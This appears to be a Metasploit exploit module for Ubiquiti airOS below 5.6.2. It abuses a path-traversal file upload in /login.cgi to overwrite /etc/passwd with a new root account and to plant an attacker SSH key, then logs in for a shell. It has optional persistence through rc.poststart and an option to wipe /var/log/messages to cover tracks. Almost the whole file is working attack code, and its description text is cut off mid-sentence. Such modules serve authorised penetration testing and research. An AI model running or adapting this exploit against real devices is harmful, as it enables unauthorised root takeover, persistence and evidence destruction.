# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit::Remote
 
  # See note about overwritten files
  Rank = ExcellentRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;               => &#039;Ubiquiti airOS Arbitrary File Upload&#039;,
      &#039;Description&#039;        => %q{
        to /etc/passwd and an SSH key to /etc/dropbear/authorized_keys.
 
        FYI, /etc/{passwd,dropbear/authorized_keys} will be overwritten.
        /etc/persistent/rc.poststart will be overwritten if PERSIST_ETC is true.
 
        This method is used by the "mf" malware infecting these devices.
      },
      &#039;Author&#039;             => [
        &#039;93c08539&#039;, # Vulnerability discovery
        &#039;wvu&#039;       # Metasploit module
      ],
      &#039;References&#039;         => [
        %w{EDB 39701},
        %w{URL https://hackerone.com/reports/73480}
      ],
      &#039;DisclosureDate&#039;     => &#039;Feb 13 2016&#039;,
      &#039;License&#039;            => MSF_LICENSE,
      &#039;Platform&#039;           => &#039;unix&#039;,
      &#039;Arch&#039;               => ARCH_CMD,
      &#039;Privileged&#039;         => true,
      &#039;Payload&#039;            => {
        &#039;Compat&#039;           => {
          &#039;PayloadType&#039;    => &#039;cmd_interact&#039;,
          &#039;ConnectionType&#039; => &#039;find&#039;
        }
      },
      &#039;Targets&#039;            => [
        [&#039;Ubiquiti airOS < 5.6.2&#039;, {}]
      ],
      &#039;DefaultTarget&#039;      => 0,
      &#039;DefaultOptions&#039;     => {
        &#039;SSL&#039; => true
      }
    ))
 
    register_options([
      Opt::RPORT(443),
      OptPort.new(&#039;SSH_PORT&#039;, [true, &#039;SSH port&#039;, 22])
    ])
 
    register_advanced_options([
      OptBool.new(&#039;PERSIST_ETC&#039;, [false, &#039;Persist in /etc/persistent&#039;, false]),
      OptBool.new(&#039;WIPE_LOGS&#039;,   [false, &#039;Wipe /var/log/messages&#039;, false]),
      OptBool.new(&#039;SSH_DEBUG&#039;,   [false, &#039;SSH debugging&#039;, false]),
      OptInt.new(&#039;SSH_TIMEOUT&#039;,  [false, &#039;SSH timeout&#039;, 10])
    ])
  end
 
  def exploit
    print_status(&#039;Uploading /etc/passwd&#039;)
    upload_etc_passwd
    print_status(&#039;Uploading /etc/dropbear/authorized_keys&#039;)
    upload_authorized_keys
    print_status("Logging in as #{username}")
    vprint_status("Password: #{password}")
    vprint_status("Private key:\n#{private_key}")
    if (ssh = ssh_login)
      print_good("Logged in as #{username}")
      handler(ssh.lsock)
    end
  end
 
  def on_new_session(session)
    super
    if datastore[&#039;PERSIST_ETC&#039;]
      print_status(&#039;Persisting in /etc/persistent&#039;)
      persist_etc(session)
    end
    if datastore[&#039;WIPE_LOGS&#039;]
      print_status(&#039;Wiping /var/log/messages&#039;)
      wipe_logs(session)
    end
  end
 
  def upload_etc_passwd
    mime = Rex::MIME::Message.new
    mime.add_part(etc_passwd, &#039;text/plain&#039;, &#039;binary&#039;,
                  &#039;form-data; name="passwd"; filename="../../etc/passwd"&#039;)
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => &#039;/login.cgi&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{mime.bound}",
      &#039;data&#039;   => mime.to_s
    )
  end
 
  def upload_authorized_keys
    mime = Rex::MIME::Message.new
    mime.add_part(authorized_keys, &#039;text/plain&#039;, &#039;binary&#039;,
                  &#039;form-data; name="authorized_keys"; &#039; \
                  &#039;filename="../../etc/dropbear/authorized_keys"&#039;)
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => &#039;/login.cgi&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{mime.bound}",
      &#039;data&#039;   => mime.to_s
    )
  end
 
  def ssh_login
    ssh_opts = {
      port:               datastore[&#039;SSH_PORT&#039;],
      auth_methods:       %w{publickey password},
      key_data:           [private_key],
      # Framework options
      msframework:        framework,
      msfmodule:          self,
      proxies:            datastore[&#039;Proxies&#039;]
    }
 
    ssh_opts.merge!(verbose: :debug) if datastore[&#039;SSH_DEBUG&#039;]
 
    begin
      ssh = Timeout.timeout(datastore[&#039;SSH_TIMEOUT&#039;]) do
        Net::SSH.start(rhost, username, ssh_opts)
      end
    rescue Net::SSH::Exception => e
      vprint_error("#{e.class}: #{e.message}")
      return nil
    end
 
    if ssh
      report_vuln(
        host: rhost,
        name: self.name,
        refs: self.references,
        info: ssh.transport.server_version.version
      )
      report_note(
        host: rhost,
        port: datastore[&#039;SSH_PORT&#039;],
        type: &#039;airos.ssh.key&#039;,
        data: private_key
      )
      return Net::SSH::CommandStream.new(ssh, &#039;/bin/sh&#039;, true)
    end
 
    nil
  end
 
  #
  # Persistence and cleanup methods
  #
 
  def persist_etc(session)
    mime = Rex::MIME::Message.new
    mime.add_part(rc_poststart, &#039;text/plain&#039;, &#039;binary&#039;,
                  &#039;form-data; name="rc.poststart"; &#039; \
                  &#039;filename="../../etc/persistent/rc.poststart"&#039;)
 
    send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039;    => &#039;/login.cgi&#039;,
      &#039;ctype&#039;  => "multipart/form-data; boundary=#{mime.bound}",
      &#039;data&#039;   => mime.to_s
    )
 
    # http://www.hwmn.org/w/Ubiquity_HOWTO
    commands = [
      "mkdir #{username}",
      "cp /etc/passwd /etc/dropbear/authorized_keys #{username}",
      &#039;cfgmtd -wp /etc&#039;
    ]
 
    commands.each do |command|
      session.shell_command_token(command)
    end
  end
 
  def wipe_logs(session)
    session.shell_command_token(&#039;> /var/log/messages&#039;)
  end
 
  #
  # /etc/passwd methods
  #
 
  def etc_passwd
    "#{username}:#{hash(password)}:0:0:Administrator:/etc/persistent:/bin/sh\n"
  end
 
  def hash(password)
    # http://man7.org/linux/man-pages/man3/crypt.3.html
    salt = Rex::Text.rand_text(2, &#039;&#039;, Rex::Text::AlphaNumeric + &#039;./&#039;)
    password.crypt(salt)
  end
 
  def username
    @username ||= Rex::Text.rand_text_alpha_lower(8)
  end
 
  def password
    @password ||= Rex::Text.rand_text_alphanumeric(8)
  end
 
  #
  # /etc/dropbear/authorized_keys methods
  #
 
  def authorized_keys
    pubkey = Rex::Text.encode_base64(ssh_keygen.public_key.to_blob)
    "#{ssh_keygen.ssh_type} #{pubkey}\n"
  end
 
  def private_key
    ssh_keygen.to_pem
  end
 
  def ssh_keygen
    @ssh_keygen ||= OpenSSL::PKey::RSA.new(2048)
  end
 
  #
  # /etc/persistent/rc.poststart methods
  #
 
  def rc_poststart
    <<EOF
cp /etc/persistent/#{username}/passwd /etc/passwd
cp /etc/persistent/#{username}/authorized_keys /etc/dropbear/authorized_keys
EOF
  end
 
end

